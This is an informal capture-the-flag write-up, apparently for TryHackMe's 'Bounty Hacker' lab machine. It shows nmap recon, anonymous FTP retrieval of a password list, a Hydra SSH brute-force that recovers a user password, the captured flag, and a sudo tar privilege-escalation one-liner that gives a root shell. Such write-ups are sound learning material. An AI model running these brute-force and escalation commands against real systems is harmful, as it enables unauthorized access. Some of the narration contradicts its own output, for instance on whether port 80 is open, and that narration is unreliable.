target: 10.10.170.195
Recon Time.
while i am running nmap i check if a port 80 is open and No port 80 open 
└─# nmap -sC -sV --top-ports 100 --min-rate 4000 10.10.170.195

PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.128.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp    open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
990/tcp   closed ftps
49152/tcp closed unknown
49153/tcp closed unknown
49154/tcp closed unknown
49155/tcp closed unknown
49156/tcp closed unknown
49157/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

No port 80 is open but for a little time just
ftp anonymous is authorized to access
Connected on tcp and found :
ftp> ls
229 Entering Extended Passive Mode (|||47230|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 

┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# cat task.txt   
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

In locks.txt file i find so many pass i think i need to crack this user using these passwd
and here :
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# hydra -l lin -P locks.txt ssh://10.10.170.195 -t 4
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-04 19:54:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.170.195:22/
[22][ssh] host: 10.10.170.195   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-04 19:54:57

Shell=
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
Privilege escalation:
Sudo Priv using /bin/tar
    (root) /bin/tar

found this in gtfobins
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# shell=/bin/bash script -q /dev/null
root@bountyhacker:~/Desktop# ls
user.txt
root@bountyhacker:~/Desktop# cat user.txt 
THM{CR1M3_SyNd1C4T3}
root@bountyhacker:~/Desktop#

